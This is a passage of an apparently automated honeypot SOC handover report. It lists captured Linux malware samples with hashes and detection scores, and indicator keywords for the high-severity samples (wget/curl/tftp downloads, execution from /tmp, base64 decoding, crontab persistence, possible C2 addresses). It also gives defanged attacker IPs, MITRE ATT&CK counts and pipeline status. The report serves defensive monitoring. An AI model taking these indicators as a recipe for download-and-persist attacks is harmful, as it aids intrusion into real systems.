| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 45/100 | 🟡 MEDIUM | **14/75** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 83/100 | 🔴 HIGH | **34/75** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 42/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **42/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 45/100 | 🟡 MEDIUM | **14/75** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 60/100 | 🟡 MEDIUM | 0/76 ✅ |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49` | ELF Binary (Linux executable) (x86-64 64-bit) | `b20f39fc00d242e7...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `bcc130d7635ef1ef7350d3135bf3e4abb606dce75f1972636144f96b12839425` | Bash Script | `bcc130d7635ef1ef...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` | ELF Binary (Linux executable) (x86 32-bit) | `c8545034cd4fe71e...` | 85/100 | 🔴 HIGH | **39/75** 🔴 |
| `cc653189103bd14e46958bae5f37f94852b7d54ced5662bf7858801c138645a8` | ELF Binary (Linux executable) (MIPS 32-bit) | `cc653189103bd14e...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `ce3cb467257e402122e4ab5f3f40fefcbdb4a662664659672a38967ee8aaaad0` | ELF Binary (Linux executable) (x86-64 64-bit) | `ce3cb467257e4021...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `d0f5cafd9fb6a363a8b97c84a3546f601a4ba10d49cdd7dae418288caec6940b` | ELF Binary (Linux executable) (x86 32-bit) | `d0f5cafd9fb6a363...` | 46/100 | 🟡 MEDIUM | **17/75** 🔴 |
| `d16bffbd3ba31504aea1fc01e66e29ad5927830ea5e2cc49369e82a7c68ec5c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `d16bffbd3ba31504...` | 43/100 | 🟡 MEDIUM | **33/73** 🔴 |
| `d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e` | Bash Script | `d46555af1173d22f...` | 70/100 | 🔴 HIGH | **26/75** 🔴 |
| `dbb7ebb960dc0d5a480f97ddde3a227a2d83fcaca7d37ae672e6a0a6785631e9` | ELF Binary (Linux executable) (AArch64 64-bit) | `dbb7ebb960dc0d5a...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `ea73a088909b53110444807188562c406c6c6c89b3748aee016bc996ab1f1318` | Unknown binary | `ea73a088909b5311...` | 55/100 | 🟡 MEDIUM | **39/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` (c8545034cd4fe71eeadb24da...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e` (d46555af1173d22f07c37ef9...)_
- `Execution from /tmp` — `/tmp/clean_crontab`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `141.11.88[.]100` | US | Vantiva SA | **100** ⚠️ | 26 |
| `209.99.185[.]59` | CH | SKN Subnet & Telecom Ltd | **100** ⚠️ | 22 |
| `144.22.238[.]238` | BR | Oracle Corporation | **100** ⚠️ | 3 |
| `157.230.42[.]17` | SG | DigitalOcean, LLC | **100** ⚠️ | 11 |
| `45.205.1[.]42` | BR | VPSVAULT.HOST LTD | **100** ⚠️ | 7 |
| `212.8.242[.]38` | NL | WorldStream B.V. | **100** ⚠️ | 14 |
| `159.65.233[.]253` | US | DigitalOcean, LLC | **100** ⚠️ | 5 |
| `66.132.195[.]86` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `69.164.217[.]245` | US | Linode | **100** ⚠️ | 50 |
| `176.65.139[.]140` | NL | Storm Industries LLC | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 159 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 158 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 3 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 3 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 2 |

---

## 🔕 False Positive Summary (7 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 3 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 537 cases |
| Tool 34  | Credential Extractor        | ✅ 161 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 19 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 7 filtered (1.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 15 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 42 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 157 priority case(s) shown individually · 10 recon entry/entries in table (5 group(s) consolidating 368 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-06-27T15:19:42Z_
